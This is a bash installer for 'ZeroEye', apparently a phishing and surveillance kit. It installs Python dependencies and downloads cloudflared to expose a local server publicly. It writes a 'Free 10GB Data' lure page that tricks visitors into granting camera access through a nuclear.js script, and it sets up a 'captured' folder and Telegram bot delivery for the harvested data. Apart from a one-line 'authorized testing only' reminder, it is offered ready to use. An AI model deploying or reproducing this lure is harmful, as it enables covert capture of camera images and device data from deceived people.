#!/bin/bash
# ZeroEye v2.1.0 - Silent Professional Installer

function print_status() {
    echo -e "\033[1;34m[*]\033[0m $1"
}

function print_success() {
    echo -e "\033[1;32m[+]\033[0m $1"
}

function print_error() {
    echo -e "\033[1;31m[!]\033[0m $1"
}

function print_warning() {
    echo -e "\033[1;33m[!]\033[0m $1"
}

function print_banner() {
    echo -e "\033[1;31m"
    echo "███████╗███████╗██████╗  ██████╗ ███████╗██╗   ██╗███████╗"
    echo "╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝╚██╗ ██╔╝██╔════╝"
    echo "  ███╔╝ █████╗  ██████╔╝██║   ██║█████╗   ╚████╔╝ █████╗  "
    echo " ███╔╝  ██╔══╝  ██╔══██╗██║   ██║██╔══╝    ╚██╔╝  ██╔══╝  "
    echo "███████╗███████╗██║  ██║╚██████╔╝███████╗   ██║   ███████╗"
    echo "╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝"
    echo -e "\033[0m"
    echo -e "\033[1;36m       >> The Nuclear Reconnaissance Tool <<\033[0m"
    echo ""
}

# Clear screen and show banner
clear
print_banner

# Security check - don't run as root
if [ "$EUID" -eq 0 ]; then
    print_error "Please do not run as root. Run as a normal user."
    exit 1
fi

# Check if we're on Kali Linux or Debian-based
if ! grep -q "Kali GNU/Linux" /etc/os-release 2>/dev/null && ! grep -q "Debian" /etc/os-release 2>/dev/null; then
    print_warning "This installer is optimized for Kali Linux/Debian systems."
    print_status "Continuing anyway..."
fi

print_status "Initializing system environment..."
print_status "Updating package databases..."

# Update system quietly
sudo apt-get update -qq > /dev/null 2>&1
if [ $? -eq 0 ]; then
    print_success "Package databases updated"
else
    print_warning "Failed to update packages - continuing anyway..."
fi

print_status "Installing system dependencies..."
sudo apt-get install -y -qq python3 python3-pip python3-venv unzip wget curl ssh > /dev/null 2>&1
if [ $? -eq 0 ]; then
    print_success "System dependencies installed"
else
    print_warning "Some dependencies failed - trying to continue..."
fi

print_status "Setting up Python virtual environment..."
if [ -d "zeroeye_venv" ]; then
    rm -rf zeroeye_venv
    print_success "Cleaned existing environment"
fi

python3 -m venv zeroeye_venv > /dev/null 2>&1
if [ $? -eq 0 ]; then
    print_success "Virtual environment created"
else
    print_error "Failed to create virtual environment"
    exit 1
fi

# Activate virtual environment
source zeroeye_venv/bin/activate

print_status "Installing Python libraries (quiet mode)..."
pip install -q --upgrade pip > /dev/null 2>&1

# Force remove conflicting packages
pip uninstall -y -q multipart > /dev/null 2>&1 || true

# Install from requirements
if [ -f "requirements.txt" ]; then
    pip install -q -r requirements.txt > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        print_success "Python dependencies installed"
    else
        print_warning "Failed to install from requirements.txt - installing manually"
        pip install -q fastapi uvicorn rich python-multipart requests > /dev/null 2>&1
        print_success "Core Python packages installed"
    fi
else
    print_warning "requirements.txt not found - installing manually"
    pip install -q fastapi uvicorn rich python-multipart requests > /dev/null 2>&1
    print_success "Core Python packages installed"
fi

# Verify critical dependencies
print_status "Verifying installations..."
if python3 -c "import fastapi, uvicorn, rich, requests" > /dev/null 2>&1; then
    print_success "Critical dependencies verified"
else
    print_error "Some dependencies failed to install"
    exit 1
fi

# NON-BLOCKING CLOUDFLARED INSTALLATION
print_status "Configuring cloudflared tunnel (non-blocking)..."
(
    # Run in background subshell
    if ! command -v cloudflared &> /dev/null && [ ! -f "cloudflared" ]; then
        # Try multiple download sources with timeout
        if timeout 30 wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared 2>/dev/null; then
            chmod +x cloudflared
            echo "✅ Cloudflared downloaded successfully"
        elif timeout 30 wget -q https://github.com/cloudflare/cloudflared/releases/download/2023.10.0/cloudflared-linux-amd64 -O cloudflared 2>/dev/null; then
            chmod +x cloudflared
            echo "✅ Cloudflared downloaded (fallback version)"
        else
            echo "⚠️  Cloudflared download skipped - will use alternative tunnels"
        fi
    else
        echo "✅ Cloudflared already available"
    fi
) &
CLOUDFLARED_PID=$!

# Continue with other installations while cloudflared downloads in background
print_status "Creating directory structure..."
mkdir -p static captured templates core
print_success "Directories created"

print_status "Setting file permissions..."
chmod +x start.sh 2>/dev/null || true
chmod +x zeroeye.py 2>/dev/null || true

# Create basic template if missing
if [ ! -d "templates" ] || [ -z "$(ls -A templates 2>/dev/null)" ]; then
    print_status "Creating default templates..."
    mkdir -p templates
    cat > templates/free_data.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Free Mobile Data</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .container { max-width: 400px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 30px; border-radius: 15px; backdrop-filter: blur(10px); }
        button { background: #4CAF50; color: white; border: none; padding: 15px 30px; border-radius: 25px; font-size: 18px; cursor: pointer; margin: 10px; }
        button:hover { background: #45a049; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎁 Free 10GB Data</h1>
        <p>Claim your free data bundle by verifying your device</p>
        <button onclick="startVerification()">Claim Now</button>
    </div>
    <script src="/static/nuclear.js"></script>
    <script>
        function startVerification() {
            document.body.innerHTML = "<div class='container'><h2>🔍 Verifying Device...</h2><p>Please allow camera access to continue</p></div>";
            // nuclear.js will auto-start
        }
    </script>
</body>
</html>
EOF
    print_success "Default template created"
fi

# Wait for cloudflared process to finish (with timeout)
print_status "Finalizing tunnel setup..."
wait $CLOUDFLARED_PID 2>/dev/null
if [ -f "cloudflared" ]; then
    print_success "Cloudflared tunnel configured"
else
    print_warning "Cloudflared not available - will use alternative tunnels"
fi

# Final verification
print_status "Running final checks..."
if [ -d "zeroeye_venv" ] && [ -f "zeroeye_venv/bin/activate" ]; then
    print_success "Virtual environment verified"
else
    print_error "Virtual environment setup incomplete"
    exit 1
fi

# Test Python imports
if zeroeye_venv/bin/python3 -c "import fastapi, uvicorn, rich, requests" > /dev/null 2>&1; then
    print_success "All Python imports working"
else
    print_error "Python imports test failed"
    exit 1
fi

echo ""
echo -e "\033[1;32m╔══════════════════════════════════════════════════════════╗"
echo -e "║                   INSTALLATION COMPLETE!                   ║"
echo -e "╚══════════════════════════════════════════════════════════╝\033[0m"
echo ""
echo -e "\033[1;36m🚀 Quick Start:\033[0m"
echo -e "   \033[1;32m./start.sh\033[0m          - Start ZeroEye (recommended)"
echo -e "   \033[1;32mpython3 zeroeye.py\033[0m  - Alternative start method"
echo ""
echo -e "\033[1;33m📖 Next Steps:\033[0m"
echo -e "   1. Get Telegram Bot Token from @BotFather"
echo -e "   2. Get your Chat ID from @userinfobot" 
echo -e "   3. Run ZeroEye and configure when prompted"
echo ""
echo -e "\033[1;31m⚠️  LEGAL REMINDER: For authorized testing only!\033[0m"
echo ""

